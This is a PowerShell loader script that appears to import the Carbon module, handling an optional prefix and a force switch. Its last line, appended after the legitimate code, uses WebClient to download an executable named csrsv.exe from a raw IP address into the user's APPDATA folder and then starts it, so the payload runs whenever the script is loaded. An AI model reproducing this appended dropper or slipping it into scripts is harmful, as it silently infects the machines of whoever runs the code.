













[CmdletBinding(SupportsShouldProcess=$true)]
param(
    
    [string]$Prefix,

    
    [Switch]$Force
)


Set-StrictMode -Version 'Latest'

$carbonPsd1Path = Join-Path -Path $PSScriptRoot -ChildPath 'Carbon.psd1' -Resolve

& {
    $originalVerbosePref = $Global:VerbosePreference
    $originalWhatIfPref = $Global:WhatIfPreference

    $Global:VerbosePreference = $VerbosePreference = 'SilentlyContinue'
    $Global:WhatIfPreference = $WhatIfPreference = $false

    try
    {
        if( $Force -and (Get-Module -Name 'Carbon') )
        {
            Remove-Module -Name 'Carbon' -Force
        }

        $optionalParams = @{ }
        if( $Prefix )
        {
            $optionalParams['Prefix'] = $Prefix
        }

        Import-Module -Name $carbonPsd1Path @optionalParams
    }
    finally
    {
        $Global:VerbosePreference = $originalVerbosePref
        $Global:WhatIfPreference = $originalWhatIfPref
    }
}
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

